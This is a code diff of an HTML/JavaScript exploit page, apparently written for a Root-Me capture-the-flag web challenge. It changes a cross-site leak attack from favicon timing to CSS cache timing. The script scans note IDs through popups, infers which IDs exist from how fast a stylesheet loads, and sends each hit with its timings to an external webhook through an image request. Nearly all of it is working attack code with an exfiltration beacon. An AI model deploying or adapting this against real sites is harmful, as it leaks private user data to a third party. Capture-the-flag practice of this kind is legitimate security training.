@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak via Favicon Cache</title>
+    <title>XS-Leak via CSS Cache</title>
 </head>
 <body>
     <h1>Scanning notes...</h1>
@@ -13,7 +13,7 @@
         const END_ID = 3000;
         const DELAY_MS = 800;
         const POPUP_TIMEOUT = 1500;
-        const FAVICON_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/images/rootme.png';
+        const RESOURCE_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -21,17 +21,23 @@
             console.log(msg);
         }
 
-        async function measureFavicon(useCacheBuster = false) {
-            const start = performance.now();
-            await new Promise((resolve) => {
-                const img = new Image();
-                img.onload = () => resolve();
-                img.onerror = () => resolve();
-                let src = FAVICON_URL;
-                if (useCacheBuster) src += '?t=' + Date.now();
-                img.src = src;
+        // Load the resource and return the time. If useCacheBuster, adds a random param to bypass cache.
+        async function measureResource(useCacheBuster = false) {
+            return new Promise((resolve) => {
+                const start = performance.now();
+                const link = document.createElement('link');
+                link.rel = 'stylesheet';
+                let url = RESOURCE_URL;
+                if (useCacheBuster) url += '?t=' + Date.now() + '_' + Math.random();
+                link.href = url;
+                link.onload = () => resolve(performance.now() - start);
+                link.onerror = () => resolve(performance.now() - start);
+                document.head.appendChild(link);
+                // Clean up after load
+                setTimeout(() => {
+                    if (link.parentNode) link.parentNode.removeChild(link);
+                }, 100);
             });
-            return performance.now() - start;
         }
 
         async function openPopupAndCache(id) {
@@ -44,25 +50,28 @@
         }
 
         async function run() {
-            // Get baseline uncached time (with cache buster)
-            const uncached = await measureFavicon(true);
-            updateStatus(`Uncached favicon load: ${uncached.toFixed(2)} ms`);
-
+            updateStatus(`Scanning IDs ${START_ID}–${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
                 updateStatus(`Testing ID ${id}...`);
+                // Measure uncached time (with cache buster)
+                const uncached = await measureResource(true);
+                updateStatus(`  Uncached load: ${uncached.toFixed(2)} ms`);
+
+                // Open the note page in a popup
                 const opened = await openPopupAndCache(id);
                 if (!opened) {
                     updateStatus(`  Popup blocked`);
                     continue;
                 }
-                // Measure favicon load again (should be cached if page was valid)
-                const cached = await measureFavicon(false);
-                updateStatus(`  Favicon load after popup: ${cached.toFixed(2)} ms`);
 
-                if (cached < uncached * 0.7) {
-                    updateStatus(`✅ Valid note at ID ${id}`);
-                    new Image().src = `${WEBHOOK}?id=${id}`;
-                    break; // remove break to continue scanning
+                // Measure again without cache buster – should be fast if the page loaded the CSS
+                const cached = await measureResource(false);
+                updateStatus(`  Cached load: ${cached.toFixed(2)} ms`);
+
+                // If cached time is significantly faster, we have a hit
+                if (cached < uncached * 0.6) {
+                    updateStatus(`✅ HIT at ID ${id}`);
+                    new Image().src = `${WEBHOOK}?id=${id}&uncached=${uncached.toFixed(0)}&cached=${cached.toFixed(0)}`;
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
